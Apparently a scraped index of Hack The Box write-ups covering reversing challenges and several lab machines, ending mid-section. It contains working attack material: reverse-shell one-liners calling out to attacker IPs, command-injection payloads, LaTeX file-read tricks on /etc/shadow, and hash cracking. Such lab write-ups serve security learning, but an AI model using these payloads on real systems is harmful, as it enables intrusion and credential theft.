point is trying to write our own encryption program in python and make sure another file is generated with exactly the same content: └─$ python reencrypt.py # generates flag.reenc from python implementation └─$ md5sum flag.enc flag.reenc 4c5c95630c496b16c9977521647d5d6a flag.enc 4c5c95630c496b16c9977521647d5d6a flag.reenc The key to do this was to used ctypes library to actually call libc srand() and rand() functions to generate the same sequence of random numbers. Once we have the encryption mechanism written in python, we can write the decryption mechanism. Just remember to invert the order of the algorithm: Request the random number for the XORRequest the random number for the bit shiftingRevert the bit shifting: what was shifted left, now is shifted right and vice versaRevert the XOR And voilà, you will get the flag!","keywords":"","version":"Next"},{"title":"Spookypass","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/spookypass","content":"Spookypass https://app.hackthebox.com/challenges/SpookyPass All the coolest ghosts in town are going to a Haunted Houseparty - can you prove you deserve to get in? This is a reversing challenge, we need to provide a password to get in. Let's use ghidra to see the code and try to find the password. Running the command: └─$ ./pass Welcome to the SPOOKIEST party of the year. Before we let you in, you'll need to give us the password: Welcome inside! HTB{uXXXXXXXX} It was extremely easy, just use ghydra and search for the text &quot;give us the password&quot;. This is the decompiled code: puts(&quot;Welcome to the \\x1b[1;3mSPOOKIEST\\x1b[0m party of the year.&quot;); printf(&quot;Before we let you in, you\\'ll need to give us the password: &quot;); fgets(local_98,0x80,stdin); pcVar2 = strchr(local_98,10); if (pcVar2 != (char *)0x0) { *pcVar2 = '\\0'; } iVar1 = strcmp(local_98,&quot;s3cr3t_p455_f0r_gh05t5_4nd_gh0ul5&quot;); Which shows the password to provide. Once provided, the program will print the flag to provide. Piece of cake!","keywords":"","version":"Next"},{"title":"Keeper","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/keeper","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Keeper","url":"/docs/write-up/htb/machines/easy/keeper#enumeration","content":" Initial scan shows only port 22 and 80, let's deep dive.  SSH: OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0  Web: nginx 1.18.0 (Ubuntu)  whatweb does not show anyhing interesting...  If we get into the page, we see a link saying:  To raise an IT support ticket, please visit tickets.keeper.htb/rt/   which might indicate a domain-sub somewhere. Before we explore that topic, let's run gobuster to see if it sees something (no luck), only index.html is there.  If we try to access, the domain is not reachable, let's try to add it to the /etc/hosts and BINGO!  Now whatweb show interesting results:  └──╼ $whatweb http://tickets.keeper.htb/ http://tickets.keeper.htb/ [200 OK] Cookies[RT_SID_tickets.keeper.htb.80], Country[RESERVED][ZZ], Email[sales@bestpractical.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[RT_SID_tickets.keeper.htb.80], IP[10.10.11.227], PasswordField[pass], Request-Tracker[4.4.4+dfsg-2ubuntu1], Script[text/javascript], Title[Login], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]   Looks like the server is running an instance of Best Practical Request Tracker (RT) version 4.4.4  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Keeper","url":"/docs/write-up/htb/machines/easy/keeper#foothold","content":" After some searching I found this page: https://www.192-168-1-1-ip.co/router/bestpractical/rt/12338/, there mentions default credentials: root/password and boom! we are logged as Admin user in the Request Tracker.  Checking the users section, we can find a user and in the comments, we can see the password. If we try to SSH with that credentials, it just works :) and we got the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Keeper","url":"/docs/write-up/htb/machines/easy/keeper#privilege-escalation","content":" In the home folder of the user there are some files that looks like a KeePass dump and database. Most likely, we need to extract the master password from it and import into a local instance of keepass.  Looks like keepass had a vulnerability and the master password can be extracted from a dump, see https://github.com/CMEPW/keepass-dump-masterkey  If we run that script it will generate a list of candidates that will lack the first character. We might need to think a bit on how to recover all the pass phrase. Maybe a google search with the guessed characters will help ...  Once we have the keepass passwword, we can browse the keys stored using kpcli. There we find the entries for root and for the user. We find the root entry as a putty key file, which we need to convert to openssh key using puttygen ","version":"Next","tagName":"h2"},{"title":"CozyHosting","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/cozy-hosting","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#enumeration","content":" Initial scans shows exposed ports 22 and 80  Looks like it's trying to redirect to http://cozyhosting.htb. Let's add it to the /etc/hosts  curl -I cozyhosting.htb HTTP/1.1 200 Server: nginx/1.18.0 (Ubuntu) Date: Thu, 21 Sep 2023 19:13:45 GMT Content-Type: text/html;charset=UTF-8 Connection: keep-alive X-Content-Type-Options: nosniff X-XSS-Protection: 0 Cache-Control: no-cache, no-store, max-age=0, must-revalidate Pragma: no-cache Expires: 0 X-Frame-Options: DENY Content-Language: en-US   Let's try to explore the directories with gobuster and it could not find anything.  Checking the headers, looks like the Content-Type is application/json, so probably there's an API behind  Checking the error pages seems the one generated by Spring Framework. We can probe that by checking if it has the /actuator endpoint public.  Probably the nginx server is acting as a proxy since the actuator returns localhost:8080 as the API address  /actuator/sessions returns interesting data:  {&quot;71555732BBE84C711A910118954B72C3&quot;:&quot;kanderson&quot;,&quot;24BF9E9AC99A7F02F4006F36634DB3F1&quot;:&quot;UNAUTHORIZED&quot;,&quot;3C47D6E35D00F4B01B7EF0EE5F3305FA&quot;:&quot;UNAUTHORIZED&quot;,&quot;217ABE7CFC46C07AF69818945F9B702E&quot;:&quot;kanderson&quot;}   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#foothold","content":" If we check the page, looks like there's a login page, if we change the JSESSIONID cookie by the value in the /actuator/sessions for user kanderson, we'll be redirected to the /admin page.  Once we enter the admin page we see a form that if we send it will call the /executessh endpoint ...  From the error, we could think that is calling the ssh command directly, so maybe this is vulnerable to command injection. We can try to get the output of id command.  Looks like hostname is validated somehow, however with username we can break the command execution:  curl -vvvvv 'http://cozyhosting.htb/executessh' -X POST \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Cookie: JSESSIONID=B762D32C36AE8003E582400AC70E4261' \\ --data-raw 'host=localhost&amp;username=`id`'   It's pretty hard to know how to make the command execution works, you need to try several combinations with \\`` and ;` and eventually got it working. Now let's open a reverse shell. In order to get the reverse shell, take into account that username cannot have spaces, a minimal validation is done.  To generate the payload that generates the reverse shell:  Search a payload here: https://www.revshells.com/  /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.183/4444 0&gt;&amp;1   Let's base64 it:  echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.183/4444 0&gt;&amp;1&quot; | base64 -w 0 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg==   Make the payload: echo the base64 payload, then base64 decode the payload and let bash run the payload:  echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg== | base64 -d | bash   You can run that payload and it should create a new connection to the listening nc  The endpoint don't link spaces, so let's replace it for the IFS character:  echo${IFS}&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvNDQ0NCAwPiYxCg==&quot;${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash  However, if we try that payload, it will complain about whitespaces...  Do URL-encode and it will work  Now we have foot-hold in the machine but without a relevant user  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#lateral-movement","content":" if we do ls we can see a jarfile, let's download it. Searching inside the jar file, we see a promising thing, the configuration for the postgres database:  spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting spring.datasource.username=postgres spring.datasource.password=Vg&amp;nvzAQ7XxR   psql --user postgres --host localhost --port 5432 --password   We can find the users database:   name | password | role -----------+--------------------------------------------------------------+----- -- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi n   The password for kanderson can be seen in the code and is MRdEQuv6~6P9  Nothing seems to indicate the password for user josh. Let's try to crack the password for admin with john the ripper:  john exfil/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   With that password, we can now enter the ssh with user josh and we are in and we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"CozyHosting","url":"/docs/write-up/htb/machines/easy/cozy-hosting#privilege-escalation","content":" sudo -l shows that the user josh can run ssh with root privileges, let's check in GTFO bins how to use it to get root access. ","version":"Next","tagName":"h2"},{"title":"Devvortex","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/devvortex","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#enumeration","content":" First of all, we access via browser to the IP and got redirected to http://devvortex.htb/, let's add it to /etc/hosts.  Navigating a bit, we can see that it might be vulnerable to file inclusion, since requesting an non-existing page: http://devvortex.htb/aa.html showed a nginx server error  └─$ whatweb http://devvortex.htb http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]   Let's try to extract all the files we can find in the server with fuff:  ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html   So far, nothing weird appears to be accessible:  about [Status: 200, Size: 7388, Words: 2258, Lines: 232, Duration: 40ms] contact [Status: 200, Size: 8884, Words: 3156, Lines: 290, Duration: 207ms] do [Status: 200, Size: 7603, Words: 2436, Lines: 255, Duration: 38ms] index [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 45ms] portfolio [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 42ms]   The images are served from http://devvortex.htb/images/hero-bg.jpg, if we try to access /images we get 403, let's try to fuzz the directories by checking if they return 403:  images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms] css [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms] js [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 52ms] [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 47ms]   Nothing so far, let's check what other ports are open with nmap:  └─$ nmap devvortex.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:42 CET Nmap scan report for devvortex.htb (10.10.11.242) Host is up (0.038s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http   Let's check versions:  http  └─$ nmap devvortex.htb -p80 -sC -sV -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET Nmap scan report for devvortex.htb (10.10.11.242) Host is up (0.037s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DevVortex Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds   ssh  └─$ nmap devvortex.htb -p22 -sC -sV -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET Nmap scan report for devvortex.htb (10.10.11.242) Host is up (0.039s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds   Nothing seems weird, let's try to scan for ALL ports opened, nothing else found.  Let's enumerate subdomains by using the Host header:  ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devvortex.htb&quot; -u http://devvortex.htb -fl 8   Got this subdomain:  dev [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 88ms]   which looks like it's serving php content: http://dev.devvortex.htb/index.php  A simple scan with ffuf reveals interesting stuff:  .git/logs/ [Status: 403, Size: 3653, Words: 792, Lines: 70, Duration: 90ms] configuration [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms] index [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 80ms]   With .git/log we can reconstruct the source code but it's returning a 403. configuration.php looks like a blank page, but it's a PHP page, so it would be interesting to note it for future usage.  Let's enumerate directories:  home [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 465ms]   http://dev.devvortex.htb/error.php --&gt; File not found.http://dev.devvortex.htb/any.php --&gt; File not found.  Looks a possible LFI attack vector, checking /robots.txt reveals this is a Joomla CMS page.  Following the paths in the robots.txt, we can see this URL: http://dev.devvortex.htb/administrator/index.php  Now that we know it's a Joomla CMS page, let's make a Google search, and we found the following links:  https://hackertarget.com/attacking-enumerating-joomla/https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomlahttps://vulncheck.com/blog/joomla-for-rce  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#foothold","content":" curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true   According to the articles, this URLS leaks the user/password for the mysql database used by joomla. However, the same user/password has been re-used for the Joomla CMS admin user  Once we have admin access to joomla instance, we can modify a template php files to include RCE, e.g.:  http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=id  Now let's send a reverse shell:  php -r '$sock=fsockopen(&quot;10.10.14.218&quot;,9001);popen(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);'   with URL-encode:  http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.218%22%2C9001%29%3Bpopen%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27  We got a reverse-shell, but to www-data user, in order to get the flag, we need to get access to logan user.  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#lateral-movement","content":" According to the article, the leaked credentials are used to connect the MySQL database, so, let's connect to the DB re-using the credentials.  We go to the users table and see the hashed passwords:  mysql&gt; select username,password from sd4fg_users; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | | logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 | +----------+--------------------------------------------------------------+   We can try to crack the hash with hashcat:  hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt   and it worked, it reveal the password for the user logan, now we can connect with SSH and read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Devvortex","url":"/docs/write-up/htb/machines/easy/devvortex#privilege-escalation","content":" logan@devvortex:~$ sudo -l [sudo] password for logan: Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli   Just do a quick search about the sudoable app and found a poc to get root access: https://github.com/diego-tella/CVE-2023-1326-PoC  I tired and it just worked giving root access and we got root flag. ","version":"Next","tagName":"h2"},{"title":"Fluffy","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/fluffy","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Fluffy","url":"/docs/write-up/htb/machines/easy/fluffy#enumeration","content":" We are told this is a Windows box  Normal nmap scan reveals a lot of stuff opened:  └─$ nmap 10.10.11.69 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 13:13 CEST Nmap scan report for 10.10.11.69 Host is up (0.034s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds   Looks like SMB ports are opened, let's check what in there:  └─$ smbclient -L \\\\10.10.11.69 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC IT Disk NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available   In the IT share we see some interesting things:  └─$ smbclient \\\\\\\\10.10.11.69\\\\IT --user=&quot;j.fleischman&quot; Password for [WORKGROUP\\j.fleischman]: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Wed Jul 30 17:27:03 2025 .. D 0 Wed Jul 30 17:27:03 2025 Everything-1.4.1.1026.x64 D 0 Fri Apr 18 17:08:44 2025 Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 17:04:05 2025 KeePass-2.58 D 0 Fri Apr 18 17:08:38 2025 KeePass-2.58.zip A 3225346 Fri Apr 18 17:03:17 2025 Upgrade_Notice.pdf A 169963 Sat May 17 16:31:07 2025 5842943 blocks of size 4096. 2236192 blocks available smb: \\&gt; pwd Current directory is \\\\10.10.11.69\\IT\\   Checking the changes from everything.exe shows something promising:  Friday, 20 June 2025: Version 1.4.1.1028 fixed a crash when getting help text from a context menu item that throws an exception. updated localization. Friday, 23 May 2025: Version 1.4.1.1027 updated localization. improved security against dll hijacking. Thursday, 1 August 2024: Version 1.4.1.1026 updated localization.   Looks like version 1.4.1.1026 is vulnerable to dll hijacking.  In the SYSVOL, there's also an interesting file:  └─$ smbclient \\\\\\\\10.10.11.69\\\\SYSVOL --user=&quot;j.fleischman&quot; Password for [WORKGROUP\\j.fleischman]: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Thu Apr 17 17:59:21 2025 .. D 0 Thu Apr 17 17:59:21 2025 fluffy.htb Dr 0 Thu Apr 17 17:59:21 2025 5842943 blocks of size 4096. 2236145 blocks available smb: \\&gt;   This looks like some Active Directory policies or something similar. According to https://blog.netwrix.com/2017/01/30/sysvol-directory  The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share.  We'll now exfiliate the files from the samba share to our computer to analyze them.  The PDF warns the sysadm to patch the system to mitigate the impact of the following CVEs:  CVE-2025-24996 - Critical  Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use https://github.com/p0dalirius/Coercer to check if we're lucky.  CVE-2025-24071 - Critical  Looks like there's a poc for CVE-2025-24071: https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-. The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.  CVE-2025-46785 - High  Related with a Buffer overflow in Zoom Workplace application. Maybe to be used for privilege escalation?  CVE-2025-29968 - High  Looks like denial of service vulnerability  CVE-2025-21193 - Medium  Spoofing in Active Directory, might be interesting  CVE-2025-3445 - Low  Relates to mholt/archiver golang  Most likely one of these vulnerabilities will be useful to us  The networks shares contain some zip files containing some exe files. Maybe there are useful somehow?  - everything-1.4.1.exe: https://www.voidtools.com/faq/ - kepass-2.58.exe: https://keepass.info/news/n250709_2.59.html   We can enumerate all the users in the machine with crackmapexec:  crackmapexec smb fluffy.htb -u anonymous -p &quot;&quot; --rid-brute 10000 &gt; users   And discard garbage data:  cat users|grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\\' |grep -Ev (DC|SVC) |tail -n +4 &gt; users.txt   ","version":"Next","tagName":"h2"},{"title":"LDAP enumeration​","type":1,"pageTitle":"Fluffy","url":"/docs/write-up/htb/machines/easy/fluffy#ldap-enumeration","content":" ldapdomaindump fluffy.htb -u 'fluffy.htb\\j.fleischman' -p 'J0elTHEM4n1990!' --no-json --no-grep   This produces the list of computers, groups, users and permissions.  ","version":"Next","tagName":"h3"},{"title":"CVE-2025-24071​","type":1,"pageTitle":"Fluffy","url":"/docs/write-up/htb/machines/easy/fluffy#cve-2025-24071","content":" We managed to fabricate the payload required and upload it via SMB.  python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep   When listening for events with responder, we get the NTLM Hash of user p.agila  [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:bd8f7fef990474ffith hashcat and rockyou, we are able to retrieve the password:  hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt   prometheusx-303  ","version":"Next","tagName":"h2"},{"title":"Bloodhound​","type":1,"pageTitle":"Fluffy","url":"/docs/write-up/htb/machines/easy/fluffy#bloodhound","content":" From the LDAP dump, we know that this user is a Service Account Manager.  We can use bloodhound to analyze the Active Directory data:  bloodhound-python -u &quot;p.agila@fluffy.htb&quot; -p &quot;prometheusx-303&quot; -ns 10.10.11.69 -d fluffy.htb -c all -dc dc01.fluffy.htb --zip   It is really import to collect all the fields, otherwise some permission declaration will not be present in the graph database. Also, the key was provide the -dc flag.  Using the bloodhound UI, we can see an interesting path: p.agila user reaches to the winrm_svc account, which most likely will allow us to connect to the machine with evil-winrm.  First, we need to add the user p.agila to SERVICE_ACCOUNTS group:  net rpc group addmem &quot;SERVICE ACCOUNTS@FLUFFY.HTB&quot; &quot;p.agila&quot; -U &quot;fluffy.htb&quot;/&quot;P.AGILA&quot;%&quot;prometheusx-303&quot; -S 10.10.11.69   The msDS-KeyCredentialLink attribute is a multi-valued attribute on AD user or computer objects used to store public key material (or references to it) for passwordless authentication methods like Windows Hello for Business (WHfB) and FIDO2 security keys. When a user attempts to authenticate using such a credential, the system presents a cryptographic proof tied to the private key, and AD validates it against the public key material linked via this attribute.  Attackers with write access to an account's msDS-KeyCredentialLink attribute can add their own public key material, creating what's known as &quot;shadow credentials.&quot; This allows the attacker to subsequently authenticate as that user without needing their password, by using the corresponding private key they control. Certipy's shadow auto command can be used to exploit this if the necessary permissions are available. While distinct from AD CS certificate abuse, it's another form of key-based authentication bypass/persistence.  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69' [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)   This is because the clock is not synchronized between the attacking machine and the target. We need to sync the clock with the target machine:  Execute the following as root:  timedatectl set-ntp off rdate -n [IP of Target]   This will stop NTP and sync the date and time with the IP provided.  After doing this, the shadow credential attack is successful and we retrieve the NT hash for winrm_svc ","version":"Next","tagName":"h3"},{"title":"Brutus","type":0,"sectionRef":"#","url":"/docs/write-up/htb/sherlocks/brutus","content":"Brutus In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution. Make sure to use 7zip to extract the file, it does not work with unzip. The sherlock is very easy to complete, just read the auth.log and use the provider parser to extract the required timestamps. Remember, they will be in your system time, you need to convert them to UTC.","keywords":"","version":"Next"},{"title":"Topology","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/topology","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/machines/easy/topology#enumeration","content":" Port 80 and 22 open  22  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   80  PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Miskatonic University | Topology Group   Browsing the website, found this subdomain: http://latex.topology.htb/equation.php, it contains a form where you input Latex commands and a mechanism behind that generates a png.  Let's search for more subdomains with gobuster:  ./gobuster vhost -u 10.10.11.217 -k --domain &quot;topology.htb&quot; --append-domain -w ~/workspace/gal/SecLists/Discovery/DNS/subdomains-top1million-5000.txt   Found subdomains:  dev.topology.htbstats.topology.htb  Most likely, the service works by writing the provided equation to a file, then invoke a command to pass from tex to png  In a log file we can see the following:  This is pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) (preloaded format=pdflatex 2022.2.15) 12 MAR 2022 08:48   We see that we can inject commands in Latex, however there are some prohibitions in place:  Prohibited commands:  \\input\\include\\verbatiminput\\write\\outfile{Hello-world}\\immediate\\write18{id &gt; output}  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/machines/easy/topology#foothold","content":" This payload works but only returns the first line:  \\newread\\file \\openin\\file=/etc/passwd \\read\\file to\\line \\text{\\line} \\closein\\file   There's another option to read files:  $\\lstinputlisting{/etc/passwd}$   Here we can see the user vdaisley.  Knowing that we have scanned the vhost and found dev and see some .htaccess and .htpasswd, now we can download them with the previous discovered reading method.  $\\lstinputlisting{&quot;/var/www/dev/.htpasswd&quot;}$ $\\lstinputlisting{&quot;/etc/shadow&quot;}$   it will download the PNG image with the file contents, the password stored is a MD5 hash, which we can extract using tesseract:  tesseract exfil/equation.png exfil/equation.txt   Then crack the hash using hashcat:  hashcat hash.txt ~/workspace/SecLists/Passwords/Leaked-Databases/rockyou.txt   This will return the password for user vdaisley, now you can SSH into the machine and get permanent access.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/machines/easy/topology#privilege-escalation","content":" In /opt we can find the gnuplot binary owned by root but with write and execution permissions for the user.  This binary is used to generate the images. We can try to see if it's execute by running ps aux multiple times.  If we don't see any result, it means the process is executed by another user. But don't worry, we can use pspy to monitor processes not belonging to our user.  And there we see root is executing the following command  2023/06/13 16:33:01 CMD: UID=0 PID=1419 | find /opt/gnuplot -name *.plt -exec gnuplot {} ;   So basically, gnuplot will execute any plt file found in /opt/gnuplot.  Now what we can do is to create a plt file that will start a reverse shell with the user root.  e.g  system &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.151/4444 0&gt;&amp;1'&quot;   Once the connection is established, we'll have root access in the console and we can read the flag. ","version":"Next","tagName":"h2"},{"title":"Codify","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/codify","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Codify","url":"/docs/write-up/htb/machines/easy/codify#enumeration","content":" curl 10.10.11.239 &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt; &lt;html&gt;&lt;head&gt; &lt;title&gt;301 Moved Permanently&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;h1&gt;Moved Permanently&lt;/h1&gt; &lt;p&gt;The document has moved &lt;a href=&quot;http://codify.htb/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;hr&gt; &lt;address&gt;Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80&lt;/address&gt; &lt;/body&gt;&lt;/html&gt;   Let's add the host to /etc/hosts  nmap reports several things opened:  PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework |_http-title: Codify   The port 80 is a webserver that hosts a NodeJS editor to execute NodeJS in a sandboxed scenario.  Port 3000 looks the same.  The sandbox looks like it's using the vm2 library:   The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.   The sandbox has the following limitations: http://codify.htb/limitations  The editor works by sending a POST request with base64 content:  curl 'http://codify.htb/run' -X POST -H 'Referer: http://codify.htb/editor' -H 'Content-Type: application/json' -H 'Origin: http://codify.htb' --data-raw '{&quot;code&quot;:&quot;YQ==&quot;}'   This request belongs to the code a:  └─$ echo YQ== | base64 -d a   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Codify","url":"/docs/write-up/htb/machines/easy/codify#foothold","content":" 